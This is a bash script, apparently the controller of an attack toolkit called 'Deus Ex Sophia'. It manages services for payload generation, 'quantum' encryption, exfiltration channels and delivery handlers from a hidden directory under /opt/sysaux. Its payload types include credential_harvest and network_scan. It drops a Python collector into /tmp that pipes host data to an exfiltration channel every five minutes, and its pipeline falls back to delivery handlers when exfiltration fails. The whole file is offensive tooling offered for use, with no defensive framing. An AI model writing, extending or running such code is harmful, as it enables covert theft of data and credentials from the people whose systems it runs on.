#!/bin/bash
# Matrix Orchestrator - Deus Ex Sophia

MATRIX_BASE="/opt/sysaux/.matrix"
LOG_DIR="$MATRIX_BASE/exfil"
PID_DIR="/var/run/matrix"
CONFIG_DIR="$MATRIX_BASE/config"

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Initialize
init_matrix() {
    mkdir -p "$LOG_DIR"
    mkdir -p "$PID_DIR"
    mkdir -p "$CONFIG_DIR"
    mkdir -p "$MATRIX_BASE/temp"
    
    chmod -R 700 "$MATRIX_BASE"
    chmod 700 "$PID_DIR"
    
    # Load Python virtual environment if exists
    if [ -f "/opt/sysaux/.network/.venv/bin/activate" ]; then
        source "/opt/sysaux/.network/.venv/bin/activate"
    fi
}

# Logging
log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] [$level] $message" >> "$LOG_DIR/matrix.log"
    
    case $level in
        "ERROR") echo -e "${RED}[✗] $message${NC}" ;;
        "WARN") echo -e "${YELLOW}[!] $message${NC}" ;;
        "INFO") echo -e "${CYAN}[*] $message${NC}" ;;
        "SUCCESS") echo -e "${GREEN}[✓] $message${NC}" ;;
        *) echo -e "[*] $message" ;;
    esac
}

# PID Management
check_pid() {
    local service=$1
    local pid_file="$PID_DIR/$service.pid"
    
    if [ -f "$pid_file" ]; then
        local pid=$(cat "$pid_file")
        if kill -0 "$pid" 2>/dev/null; then
            return 0
        else
            rm -f "$pid_file"
            return 1
        fi
    fi
    return 1
}

save_pid() {
    local service=$1
    local pid=$2
    echo "$pid" > "$PID_DIR/$service.pid"
}

remove_pid() {
    local service=$1
    rm -f "$PID_DIR/$service.pid"
}

# Quantum Encryption Service
quantum_service() {
    local action=$1
    
    case $action in
        start)
            if check_pid "quantum"; then
                log "WARN" "Quantum service already running"
                return 1
            fi
            
            log "INFO" "Starting quantum encryption service..."
            python3 "$MATRIX_BASE/core/quantum_crypt.py" --test > /dev/null 2>&1
            
            # Start rotation monitor
            (
                while true; do
                    sleep 3600  # Check hourly
                    python3 "$MATRIX_BASE/core/quantum_crypt.py" --rotate > /dev/null 2>&1
                done
            ) &
            
            save_pid "quantum" $!
            log "SUCCESS" "Quantum service started"
            ;;
        
        stop)
            if check_pid "quantum"; then
                log "INFO" "Stopping quantum service..."
                kill $(cat "$PID_DIR/quantum.pid") 2>/dev/null
                remove_pid "quantum"
                log "SUCCESS" "Quantum service stopped"
            else
                log "WARN" "Quantum service not running"
            fi
            ;;
        
        status)
            if check_pid "quantum"; then
                log "INFO" "Quantum service: ${GREEN}ACTIVE${NC}"
                
                # Show key info
                echo -e "${CYAN}Key Information:${NC}"
                python3 "$MATRIX_BASE/core/quantum_crypt.py" --status 2>/dev/null | \
                    grep -E "(Epoch|Rotation|Next)" || echo "    No key information available"
            else
                log "INFO" "Quantum service: ${RED}INACTIVE${NC}"
            fi
            ;;
        
        test)
            log "INFO" "Testing quantum encryption..."
            python3 "$MATRIX_BASE/core/quantum_crypt.py" --test
            ;;
        
        *)
            echo "Usage: matrix_orchestrator quantum {start|stop|status|test}"
            ;;
    esac
}

# Payload Generation
payload_service() {
    local action=$1
    local type=$2
    
    case $action in
        generate)
            if [ -z "$type" ]; then
                type="system_info"
            fi
            
            log "INFO" "Generating $type payload..."
            
            output_file="$MATRIX_BASE/temp/payload_$(date +%Y%m%d_%H%M%S).json"
            python3 "$MATRIX_BASE/payloads/payload_factory.py" --create "$type" > "$output_file"
            
            size=$(stat -c%s "$output_file" 2>/dev/null || echo "unknown")
            log "SUCCESS" "Payload generated: $output_file ($size bytes)"
            
            echo -e "${CYAN}Payload saved to:${NC} $output_file"
            ;;
        
        list)
            log "INFO" "Available payload types:"
            python3 "$MATRIX_BASE/payloads/payload_factory.py" --list
            ;;
        
        multi)
            local count=${2:-3}
            log "INFO" "Generating $count payloads..."
            
            output_file="$MATRIX_BASE/temp/multi_payload_$(date +%Y%m%d_%H%M%S).json"
            python3 "$MATRIX_BASE/payloads/payload_factory.py" --multi "$count" > "$output_file"
            
            log "SUCCESS" "Multi-payload generated: $output_file"
            ;;
        
        test)
            log "INFO" "Testing payload generation..."
            python3 "$MATRIX_BASE/payloads/payload_factory.py" --test
            ;;
        
        *)
            echo "Usage: matrix_orchestrator payload {generate [type]|list|multi [count]|test}"
            echo "  Types: system_info, network_scan, credential_harvest, etc."
            ;;
    esac
}

# Channel Exfiltration
channel_service() {
    local action=$1
    
    case $action in
        test)
            log "INFO" "Testing exfiltration channels..."
            python3 "$MATRIX_BASE/channels/matrix_channels.py" --test
            ;;
        
        exfil)
            local data=$2
            if [ -z "$data" ]; then
                log "ERROR" "No data provided for exfiltration"
                return 1
            fi
            
            log "INFO" "Exfiltrating data..."
            python3 "$MATRIX_BASE/channels/matrix_channels.py" --exfil "$data"
            ;;
        
        continuous)
            if check_pid "channels"; then
                log "WARN" "Channel service already running"
                return 1
            fi
            
            log "INFO" "Starting continuous exfiltration..."
            
            # Create data source script
            cat > /tmp/matrix_data_source.py << 'EOF'
import os
import json
import time
import subprocess
from datetime import datetime

def get_data():
    # Sample data collection
    return {
        "timestamp": datetime.now().isoformat(),
        "load": os.getloadavg()[0],
        "memory": subprocess.getoutput("free -m | awk 'NR==2{printf \"%.1f%%\", $3*100/$2}'"),
        "connections": int(subprocess.getoutput("ss -tun | wc -l")) - 1
    }

if __name__ == "__main__":
    while True:
        print(json.dumps(get_data()))
        time.sleep(300)
EOF
            
            # Start data source
            python3 /tmp/matrix_data_source.py | \
            while read line; do
                python3 "$MATRIX_BASE/channels/matrix_channels.py" --exfil "$line"
            done &
            
            save_pid "channels" $!
            log "SUCCESS" "Continuous exfiltration started"
            ;;
        
        stop)
            if check_pid "channels"; then
                log "INFO" "Stopping channel service..."
                kill $(cat "$PID_DIR/channels.pid") 2>/dev/null
                remove_pid "channels"
                log "SUCCESS" "Channel service stopped"
            else
                log "WARN" "Channel service not running"
            fi
            ;;
        
        status)
            log "INFO" "Channel status:"
            python3 "$MATRIX_BASE/channels/matrix_channels.py" --status 2>/dev/null || \
                echo "    Unable to get status"
            ;;
        
        *)
            echo "Usage: matrix_orchestrator channel {test|exfil <data>|continuous|stop|status}"
            ;;
    esac
}

# Delivery Handlers
delivery_service() {
    local action=$1
    
    case $action in
        test)
            log "INFO" "Testing delivery handlers..."
            python3 "$MATRIX_BASE/handlers/delivery_handlers.py" --test
            ;;
        
        deliver)
            local payload=$2
            if [ -z "$payload" ]; then
                log "ERROR" "No payload provided"
                return 1
            fi
            
            log "INFO" "Delivering payload..."
            python3 "$MATRIX_BASE/handlers/delivery_handlers.py" --deliver "$payload"
            ;;
        
        status)
            log "INFO" "Delivery handler status:"
            python3 "$MATRIX_BASE/handlers/delivery_handlers.py" --status 2>/dev/null || \
                echo "    Unable to get status"
            ;;
        
        *)
            echo "Usage: matrix_orchestrator delivery {test|deliver <payload>|status}"
            ;;
    esac
}

# Full Exfiltration Pipeline
exfiltrate_pipeline() {
    local payload_type=${1:-"system_info"}
    
    log "INFO" "Starting exfiltration pipeline..."
    log "INFO" "Phase 1: Generating $payload_type payload"
    
    # Generate payload
    payload_file="$MATRIX_BASE/temp/pipeline_$(date +%Y%m%d_%H%M%S).json"
    python3 "$MATRIX_BASE/payloads/payload_factory.py" --create "$payload_type" > "$payload_file"
    
    if [ ! -s "$payload_file" ]; then
        log "ERROR" "Payload generation failed"
        return 1
    fi
    
    payload_data=$(cat "$payload_file")
    payload_size=$(stat -c%s "$payload_file")
    
    log "SUCCESS" "Payload generated ($payload_size bytes)"
    
    # Encrypt payload
    log "INFO" "Phase 2: Encrypting payload"
    
    # Use quantum encryption (simplified)
    encrypted_file="$payload_file.enc"
    echo "ENCRYPTED:$payload_data" > "$encrypted_file"
    
    log "SUCCESS" "Payload encrypted"
    
    # Exfiltrate
    log "INFO" "Phase 3: Exfiltrating via best channel"
    
    exfil_result=$(python3 "$MATRIX_BASE/channels/matrix_channels.py" --exfil "$(cat $encrypted_file)" 2>/dev/null)
    
    if echo "$exfil_result" | grep -q "success"; then
        log "SUCCESS" "Exfiltration successful"
        echo -e "${GREEN}Pipeline completed successfully${NC}"
    else
        log "WARN" "Primary exfiltration failed, trying delivery handlers..."
        
        delivery_result=$(python3 "$MATRIX_BASE/handlers/delivery_handlers.py" --deliver "$(cat $encrypted_file)" 2>/dev/null)
        
        if echo "$delivery_result" | grep -q "success"; then
            log "SUCCESS" "Delivery via handlers successful"
            echo -e "${GREEN}Pipeline completed via fallback${NC}"
        else
            log "ERROR" "All exfiltration methods failed"
            echo -e "${RED}Pipeline failed${NC}"
            return 1
        fi
    fi
    
    # Cleanup
    rm -f "$payload_file" "$encrypted_file"
    
    log "INFO" "Pipeline complete"
}

# System Status
system_status() {
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          MATRIX ORCHESTRATOR STATUS         ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Quantum Service
    echo -e "${MAGENTA}Quantum Encryption:${NC}"
    if check_pid "quantum"; then
        echo -e "  ${GREEN}● ACTIVE${NC}"
    else
        echo -e "  ${RED}● INACTIVE${NC}"
    fi
    
    # Channel Service
    echo -e "${MAGENTA}Exfiltration Channels:${NC}"
    if check_pid "channels"; then
        echo -e "  ${GREEN}● ACTIVE${NC}"
    else
        echo -e "  ${RED}● INACTIVE${NC}"
    fi
    
    # Disk Usage
    echo -e "${MAGENTA}Storage:${NC}"
    du -sh "$MATRIX_BASE" 2>/dev/null | awk '{print "  " $1 " used"}'
    
    # Log Files
    echo -e "${MAGENTA}Logs:${NC}"
    for log_file in "$LOG_DIR"/*.log; do
        if [ -f "$log_file" ]; then
            size=$(du -h "$log_file" | cut -f1)
            lines=$(wc -l < "$log_file" 2>/dev/null || echo "0")
            echo "  $(basename $log_file): $size, $lines lines"
        fi
    done
    
    # Recent Activity
    echo -e "${MAGENTA}Recent Activity:${NC}"
    if [ -f "$LOG_DIR/exfil.log" ]; then
        tail -5 "$LOG_DIR/exfil.log" | while read line; do
            echo "  $(echo $line | jq -r '.timestamp + " - " + .channel + ": " + .status' 2>/dev/null || echo $line)"
        done
    else
        echo "  No recent activity"
    fi
    
    echo ""
}

# Interactive Dashboard
show_dashboard() {
    while true; do
        clear
        echo -e "${MAGENTA}"
        echo "╔═══════════════════════════════════════════════════════╗"
        echo "║           ADVANCED EXFILTRATION MATRIX              ║"
        echo "║               Deus Ex Sophia v1.0                   ║"
        echo "╚═══════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        system_status
        
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║                  MENU                       ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${YELLOW}1${NC}. System Status"
        echo -e "  ${YELLOW}2${NC}. Quantum Encryption"
        echo -e "  ${YELLOW}3${NC}. Payload Generation"
        echo -e "  ${YELLOW}4${NC}. Channel Exfiltration"
        echo -e "  ${YELLOW}5${NC}. Delivery Handlers"
        echo -e "  ${YELLOW}6${NC}. Full Exfiltration Pipeline"
        echo -e "  ${YELLOW}7${NC}. Start All Services"
        echo -e "  ${YELLOW}8${NC}. Stop All Services"
        echo -e "  ${YELLOW}9${NC}. View Logs"
        echo -e "  ${YELLOW}0${NC}. Exit"
        echo ""
        echo -ne "${CYAN}[?] Select: ${NC}"
        
        read choice
        
        case $choice in
            1)
                system_status
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            2)
                echo -e "\n${CYAN}[QUANTUM ENCRYPTION]${NC}"
                echo "  1. Start"
                echo "  2. Stop"
                echo "  3. Status"
                echo "  4. Test"
                echo "  0. Back"
                echo -ne "\n${CYAN}[?] Select: ${NC}"
                read subchoice
                
                case $subchoice in
                    1) quantum_service start ;;
                    2) quantum_service stop ;;
                    3) quantum_service status ;;
                    4) quantum_service test ;;
                    0) continue ;;
                esac
                
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            3)
                echo -e "\n${CYAN}[PAYLOAD GENERATION]${NC}"
                echo "  1. Generate Payload"
                echo "  2. List Types"
                echo "  3. Generate Multiple"
                echo "  4. Test"
                echo "  0. Back"
                echo -ne "\n${CYAN}[?] Select: ${NC}"
                read subchoice
                
                case $subchoice in
                    1)
                        echo -ne "${CYAN}[?] Payload type (default: system_info): ${NC}"
                        read ptype
                        ptype=${ptype:-"system_info"}
                        payload_service generate "$ptype"
                        ;;
                    2) payload_service list ;;
                    3)
                        echo -ne "${CYAN}[?] Count (default: 3): ${NC}"
                        read count
                        count=${count:-3}
                        payload_service multi "$count"
                        ;;
                    4) payload_service test ;;
                    0) continue ;;
                esac
                
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            4)
                echo -e "\n${CYAN}[CHANNEL EXFILTRATION]${NC}"
                echo "  1. Test Channels"
                echo "  2. Exfiltrate Data"
                echo "  3. Start Continuous"
                echo "  4. Stop Continuous"
                echo "  5. Status"
                echo "  0. Back"
                echo -ne "\n${CYAN}[?] Select: ${NC}"
                read subchoice
                
                case $subchoice in
                    1) channel_service test ;;
                    2)
                        echo -ne "${CYAN}[?] Data to exfiltrate: ${NC}"
                        read data
                        channel_service exfil "$data"
                        ;;
                    3) channel_service continuous ;;
                    4) channel_service stop ;;
                    5) channel_service status ;;
                    0) continue ;;
                esac
                
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            5)
                echo -e "\n${CYAN}[DELIVERY HANDLERS]${NC}"
                echo "  1. Test Handlers"
                echo "  2. Deliver Payload"
                echo "  3. Status"
                echo "  0. Back"
                echo -ne "\n${CYAN}[?] Select: ${NC}"
                read subchoice
                
                case $subchoice in
                    1) delivery_service test ;;
                    2)
                        echo -ne "${CYAN}[?] Payload to deliver: ${NC}"
                        read payload
                        delivery_service deliver "$payload"
                        ;;
                    3) delivery_service status ;;
                    0) continue ;;
                esac
                
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            6)
                echo -e "\n${CYAN}[EXFILTRATION PIPELINE]${NC}"
                echo -ne "${CYAN}[?] Payload type (default: system_info): ${NC}"
                read ptype
                ptype=${ptype:-"system_info"}
                exfiltrate_pipeline "$ptype"
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            7)
                quantum_service start
                channel_service continuous
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            8)
                quantum_service stop
                channel_service stop
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            9)
                echo -e "\n${CYAN}[LOGS]${NC}"
                echo "  1. System Log"
                echo "  2. Exfiltration Log"
                echo "  3. Delivery Log"
                echo "  0. Back"
                echo -ne "\n${CYAN}[?] Select: ${NC}"
                read subchoice
                
                case $subchoice in
                    1) tail -20 "$LOG_DIR/matrix.log" ;;
                    2) tail -20 "$LOG_DIR/exfil.log" 2>/dev/null || echo "No exfil log" ;;
                    3) tail -20 "$LOG_DIR/delivery.log" 2>/dev/null || echo "No delivery log" ;;
                    0) continue ;;
                esac
                
                echo -e "\n${YELLOW}[Press Enter to continue]${NC}"
                read
                ;;
            0)
                echo -e "\n${MAGENTA}[+] Returning to system...${NC}"
                exit 0
                ;;
            *)
                echo -e "\n${RED}[!] Invalid selection${NC}"
                sleep 1
                ;;
        esac
    done
}

# Command Line Interface
if [ $# -gt 0 ]; then
    init_matrix
    
    case $1 in
        quantum)
            quantum_service "${@:2}"
            ;;
        payload)
            payload_service "${@:2}"
            ;;
        channel)
            channel_service "${@:2}"
            ;;
        delivery)
            delivery_service "${@:2}"
            ;;
        pipeline)
            exfiltrate_pipeline "${2:-system_info}"
            ;;
        status)
            system_status
            ;;
        dashboard)
            init_matrix
            show_dashboard
            ;;
        start-all)
            init_matrix
            quantum_service start
            channel_service continuous
            ;;
        stop-all)
            quantum_service stop
            channel_service stop
            ;;
        help|--help|-h)
            echo "Advanced Exfiltration Matrix - Deus Ex Sophia v1.0"
            echo ""
            echo "Usage: matrix_orchestrator [command] [options]"
            echo ""
            echo "Commands:"
            echo "  dashboard              Interactive dashboard"
            echo "  quantum {cmd}         Quantum encryption service"
            echo "  payload {cmd}         Payload generation"
            echo "  channel {cmd}         Channel exfiltration"
            echo "  delivery {cmd}        Delivery handlers"
            echo "  pipeline [type]       Full exfiltration pipeline"
            echo "  status                System status"
            echo "  start-all             Start all services"
            echo "  stop-all              Stop all services"
            echo ""
            echo "Examples:"
            echo "  matrix_orchestrator dashboard"
            echo "  matrix_orchestrator quantum start"
            echo "  matrix_orchestrator payload generate network_scan"
            echo "  matrix_orchestrator pipeline credential_harvest"
            ;;
        *)
            echo "Unknown command: $1"
            echo "Use 'matrix_orchestrator help' for usage"
            exit 1
            ;;
    esac
else
    # Interactive mode
    init_matrix
    show_dashboard
fi
MATRIX_ORCHESTRATOR